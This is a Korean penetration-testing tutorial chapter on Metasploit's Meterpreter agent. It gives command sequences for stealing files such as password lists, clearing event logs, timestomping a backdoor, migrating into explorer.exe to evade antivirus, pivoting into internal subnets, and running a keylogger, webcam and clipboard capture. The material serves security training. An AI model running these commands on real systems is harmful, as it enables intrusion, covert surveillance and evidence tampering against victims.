Chapter 05

Meterpreter 완전 정복

단순한 셸을 넘어선 강력한 에이전트 — 메모리 상주 방식의 원리, 파일시스템 조작, 프로세스 마이그레이션, 네트워크 피벗까지

🧠 Meterpreter는 왜 특별한가?

일반적인 리버스 셸을 얻으면 타깃에서 명령어를 실행할 수 있습니다. 하지만 그게 전부입니다. 파일을 올리고 내리려면, 프로세스에 숨으려면, 네트워크 트래픽을 암호화하려면 일반 셸로는 모든 것을 직접 구현해야 합니다.

Meterpreter는 이 문제를 근본적으로 다른 방식으로 해결합니다. 타깃의 디스크에 파일을 쓰지 않고 오직 메모리(RAM)에만 상주합니다. 안티바이러스가 파일 시스템을 스캔해도 Meterpreter를 발견하기 어려운 이유입니다. 또한 공격자와의 모든 통신을 TLS로 암호화합니다.

💡
Meterpreter 내부 동작 원리

Meterpreter는 타깃 프로세스에 DLL 인젝션 방식으로 로드됩니다. 독립 프로세스로 실행되지 않아 프로세스 목록에서 의심스러운 이름이 보이지 않습니다. 공격자와의 통신은 Metasploit의 TLV(Type-Length-Value) 프로토콜로 암호화되어 네트워크 패킷만 봐서는 내용을 파악하기 어렵습니다.

📁 파일 시스템 조작

🔨 파일 명령어 모음 
# 현재 디렉토리 / 목록
meterpreter > pwd
meterpreter > ls

# 읽기 / 수정 / 삭제하기
meterpreter > cat C:\\Users\\Administrator\\Desktop\\note.txt
meterpreter > edit C:\\Windows\\System32\\drivers\\etc\\hosts
meterpreter > rm C:\\evil.exe

# 파일 다운로드 (타깃 → 공격자)
meterpreter > download C:\\Users\\victim\\passwords.txt /tmp/
meterpreter > download -r C:\\Users\\victim\\Desktop /tmp/loot/

# 파일 업로드 (공격자 → 타깃)
meterpreter > upload /tmp/tool.exe C:\\Windows\\Temp\\

# 파일 검색
meterpreter > search -f "*.txt" -d C:\\Users
meterpreter > search -f "password*"

# 이벤트 로그 삭제 (윈도우에 지금까지 쌓인 모든 로그 삭제 → 역효과 낳음)
meterpreter > clearev

# 타임스탬프 조작 (수정/접근/생성 시간 변경)
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"

# MFT 엔트리 수정 시간 변경, NTFS 전용
meterpreter > timestomp C:\\backdoor.exe -e "01/01/2020 00:00:00"

# 타임스탬프 확인
meterpreter > timestomp C:\\backdoor.exe -v

⚙️ 프로세스 마이그레이션 — 더 안전한 곳으로

Meterpreter가 로드된 초기 프로세스는 안티바이러스에 의해 종료될 수 있습니다. explorer.exe나 svchost.exe 같은 시스템 프로세스로 이동하는 것이 실전에서 핵심 기술입니다.

🔨 프로세스 마이그레이션 
# 프로세스 목록 확인
meterpreter > ps

# PID로 마이그레이션
meterpreter > migrate 668

# 프로세스 이름으로 마이그레이션
meterpreter > migrate -N explorer.exe
[*] Migration completed successfully.

# 현재 사용자 및 PID 확인
meterpreter > getuid
meterpreter > getpid

🌐 네트워크 피벗

침투한 시스템이 내부 네트워크에 더 깊이 연결되어 있다면, 그 시스템을 다리 삼아 원래 접근할 수 없던 서브넷으로 들어갈 수 있습니다.

🔨 autoroute 피벗 
# 타깃 네트워크 인터페이스 확인
meterpreter > ipconfig

# 백그라운드로 전환
meterpreter > background

# autoroute로 내부망 라우트 자동 추가
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > run
[+] Route added: 10.10.10.0/255.255.255.0 via session 1

# 내부망 스캔 가능해짐
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.0/24
msf6 > run

📸 정보 수집 — 스크린샷, 키로거

🔨 스파이 기능 활용 
# 화면 캡처
meterpreter > screenshot

# 키로거
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# 웹캠 스냅샷
meterpreter > webcam_snap

# 클립보드 내용 읽기
meterpreter > clipboard_get

# 시스템 정보
meterpreter > sysinfo

# Meterpreter 도움말 (모든 명령어)
meterpreter > help
⚠️
윤리적 사용 경계

키로거와 스크린샷은 개인정보 침해 소지가 큽니다. 반드시 계약 범위 내에서만 사용하고 보고서에 기재해야 합니다.
